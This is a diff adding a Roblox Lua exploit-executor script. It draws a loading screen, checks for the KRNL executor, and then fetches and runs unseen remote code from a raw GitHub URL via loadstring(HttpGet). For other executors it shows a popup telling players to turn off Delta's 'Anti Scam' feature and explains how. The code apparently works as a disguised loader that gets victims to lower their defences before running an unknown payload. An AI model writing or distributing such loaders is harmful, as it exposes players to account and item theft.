@@ -1,0 +1,226 @@
+--// Services
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+
+--// ScreenGui for loading
+local LoadingGui = Instance.new("ScreenGui")
+LoadingGui.Name = "KernelCheckLoading"
+LoadingGui.IgnoreGuiInset = true
+LoadingGui.ResetOnSpawn = false
+LoadingGui.Parent = PlayerGui
+
+--// Fullscreen Black Background
+local LoadingFrame = Instance.new("Frame")
+LoadingFrame.Size = UDim2.new(1, 0, 1, 0)
+LoadingFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+LoadingFrame.Parent = LoadingGui
+
+--// Loading Text Label
+local CombinedLoading = Instance.new("TextLabel")
+CombinedLoading.AnchorPoint = Vector2.new(0.5, 0.5)
+CombinedLoading.Position = UDim2.new(0.5, 0, 0.4, 0)
+CombinedLoading.Size = UDim2.new(0.8, 0, 0.1, 0)
+CombinedLoading.TextColor3 = Color3.new(1, 1, 1)
+CombinedLoading.BackgroundTransparency = 1
+CombinedLoading.Font = Enum.Font.SourceSansBold
+CombinedLoading.TextScaled = true
+CombinedLoading.Text = "⌛ Loading"
+CombinedLoading.Parent = LoadingFrame
+
+--// Loading Bar Background
+local BarBG = Instance.new("Frame")
+BarBG.Size = UDim2.new(0.6, 0, 0.02, 0)
+BarBG.Position = UDim2.new(0.2, 0, 0.5, 0)
+BarBG.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+BarBG.BorderSizePixel = 0
+BarBG.Parent = LoadingFrame
+
+--// Loading Bar Fill
+local BarFill = Instance.new("Frame")
+BarFill.Size = UDim2.new(0, 0, 1, 0)
+BarFill.BackgroundColor3 = Color3.fromRGB(85, 255, 127)
+BarFill.BorderSizePixel = 0
+BarFill.Parent = BarBG
+
+--// Animate Text
+local dots = 0
+local loading = true
+task.spawn(function()
+	while loading do
+		dots = (dots + 1) % 4
+		CombinedLoading.Text = "⌛ Loading" .. string.rep(".", dots)
+		wait(0.4)
+	end
+end)
+
+--// Animate Loading Bar
+TweenService:Create(BarFill, TweenInfo.new(3, Enum.EasingStyle.Quad), {
+	Size = UDim2.new(1, 0, 1, 0)
+}):Play()
+
+--// KRNL Check
+local function isUsingKRNL()
+	return identifyexecutor and string.find(identifyexecutor():lower(), "krnl")
+end
+
+wait(3)
+if isUsingKRNL() then
+	CombinedLoading.Text = "⌛ KRNL Detected. Launching..."
+	wait(1)
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/FakeMcdz/Petmuta/refs/heads/main/Mayloading"))()
+else
+	CombinedLoading.Text = "❌ Executor not supported. KRNL required."
+	wait(2)
+end
+
+loading = false
+wait(1)
+LoadingGui:Destroy()
+
+--// DeltaWarningDashboard GUI
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "DeltaWarningDashboard"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.IgnoreGuiInset = true
+ScreenGui.Parent = PlayerGui
+
+--// Main Frame
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0.5, 0, 0.5, 0) -- Increase height from 0.4 to 0.5
+Frame.Position = UDim2.new(0.25, 0, 0.3, 0)
+Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Frame.BorderSizePixel = 4
+Frame.BackgroundTransparency = 0
+Frame.Name = "WarningBox"
+Frame.Parent = ScreenGui
+
+--// Rainbow Border Effect
+local rainbow = 0
+RunService.RenderStepped:Connect(function()
+	rainbow = (rainbow + 1) % 360
+	local color = Color3.fromHSV(rainbow / 360, 1, 1)
+	Frame.BorderColor3 = color
+end)
+
+--// Warning Icon
+local Icon = Instance.new("TextLabel")
+Icon.Size = UDim2.new(0.15, 0, 1, 0)
+Icon.Position = UDim2.new(0, 0, 0, 0)
+Icon.BackgroundTransparency = 1
+Icon.Text = "⚠️"
+Icon.Font = Enum.Font.SourceSansBold
+Icon.TextScaled = true
+Icon.TextColor3 = Color3.fromRGB(255, 200, 0)
+Icon.Parent = Frame
+
+--// Main Warning Text
+local TextLabel = Instance.new("TextLabel")
+TextLabel.Size = UDim2.new(0.85, -20, 0.45, 0)
+TextLabel.Position = UDim2.new(0.15, 10, 0, 0)
+TextLabel.BackgroundTransparency = 1
+TextLabel.TextColor3 = Color3.new(1, 1, 1)
+TextLabel.TextWrapped = true
+TextLabel.TextScaled = true
+TextLabel.Font = Enum.Font.SourceSansBold
+TextLabel.Text = "Currently not working on Delta.\nUse KRNL or turn off Anti Scam on Delta."
+TextLabel.Parent = Frame
+
+--// Download KRNL Button
+local DownloadButton = Instance.new("TextButton")
+DownloadButton.Size = UDim2.new(0.5, 0, 0.15, 0)
+DownloadButton.Position = UDim2.new(0.25, 0, 0.5, 0)
+DownloadButton.BackgroundColor3 = Color3.fromRGB(255, 85, 85)
+DownloadButton.Text = "Download KRNL (krnl.vip)"
+DownloadButton.TextColor3 = Color3.new(1, 1, 1)
+DownloadButton.TextScaled = true
+DownloadButton.Font = Enum.Font.SourceSansBold
+DownloadButton.Parent = Frame
+
+DownloadButton.MouseButton1Click:Connect(function()
+	setclipboard("https://krnl.vip")
+	DownloadButton.Text = "Link copied to clipboard!"
+end)
+
+--// Tutorial Button
+local TutorialButton = Instance.new("TextButton")
+TutorialButton.Size = UDim2.new(0.5, 0, 0.15, 0)
+TutorialButton.Position = UDim2.new(0.25, 0, 0.7, 0)
+TutorialButton.BackgroundColor3 = Color3.fromRGB(85, 170, 255)
+TutorialButton.Text = "How to Disable Anti Scam?"
+TutorialButton.TextColor3 = Color3.new(1, 1, 1)
+TutorialButton.TextScaled = true
+TutorialButton.Font = Enum.Font.SourceSansBold
+TutorialButton.Parent = Frame
+
+--// Tutorial Popup
+local TutorialPopup = Instance.new("Frame")
+TutorialPopup.Size = UDim2.new(0.6, 0, 0.6, 0)
+TutorialPopup.Position = UDim2.new(0.2, 0, 0.2, 0)
+TutorialPopup.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+TutorialPopup.BorderColor3 = Color3.fromRGB(0, 170, 255)
+TutorialPopup.BorderSizePixel = 3
+TutorialPopup.Visible = false
+TutorialPopup.Parent = ScreenGui
+
+local CloseTutorial = Instance.new("TextButton")
+CloseTutorial.Size = UDim2.new(0, 40, 0, 40)
+CloseTutorial.Position = UDim2.new(1, -50, 0, 10)
+CloseTutorial.Text = "✖"
+CloseTutorial.TextScaled = true
+CloseTutorial.Font = Enum.Font.SourceSansBold
+CloseTutorial.TextColor3 = Color3.new(1, 1, 1)
+CloseTutorial.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
+CloseTutorial.Parent = TutorialPopup
+
+local InstructionText = Instance.new("TextLabel")
+InstructionText.Size = UDim2.new(1, -40, 0.45, 0)
+InstructionText.Position = UDim2.new(0.5, 0, 0.42, 0)
+InstructionText.AnchorPoint = Vector2.new(0.5, 0.5)
+InstructionText.BackgroundTransparency = 1
+InstructionText.TextColor3 = Color3.new(1, 1, 1)
+InstructionText.TextScaled = true
+InstructionText.Font = Enum.Font.SourceSansBold
+InstructionText.TextWrapped = true
+InstructionText.TextXAlignment = Enum.TextXAlignment.Center
+InstructionText.TextYAlignment = Enum.TextYAlignment.Center
+InstructionText.Text = "To disable Anti Scam:\nOpen Delta Floating Logo, tap the ⚙️ icon, find 'Anti Scam', and turn it off."
+InstructionText.Parent = TutorialPopup
+
+local Image = Instance.new("ImageLabel")
+Image.Size = UDim2.new(1, -20, 0.55, 0)
+Image.Position = UDim2.new(0, 10, 0.35, 0)
+Image.BackgroundTransparency = 1
+Image.ScaleType = Enum.ScaleType.Fit
+Image.Image = "rbxassetid://PUT_IMAGE_ID_HERE" -- Replace this
+Image.Parent = TutorialPopup
+
+TutorialButton.MouseButton1Click:Connect(function()
+	TutorialPopup.Visible = true
+end)
+
+CloseTutorial.MouseButton1Click:Connect(function()
+	TutorialPopup.Visible = false
+end)
+
+--// Player Profile
+local ProfilePic = Instance.new("ImageLabel")
+ProfilePic.Size = UDim2.new(0, 60, 0, 60)
+ProfilePic.Position = UDim2.new(1, -70, 1, -70)
+ProfilePic.BackgroundTransparency = 1
+ProfilePic.Image = Players:GetUserThumbnailAsync(LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size100x100)
+ProfilePic.Parent = Frame
+
+local NameLabel = Instance.new("TextLabel")
+NameLabel.Size = UDim2.new(1, 0, 0.3, 0)
+NameLabel.Position = UDim2.new(0, 0, -0.35, 0) -- Above the image
+NameLabel.BackgroundTransparency = 1
+NameLabel.Text = LocalPlayer.DisplayName
+NameLabel.TextColor3 = Color3.new(1, 1, 1)
+NameLabel.Font = Enum.Font.SourceSansBold
+NameLabel.TextScaled = true
+NameLabel.TextWrapped = true
+NameLabel.TextXAlignment = Enum.TextXAlignment.Center
+NameLabel.Parent = ProfilePic
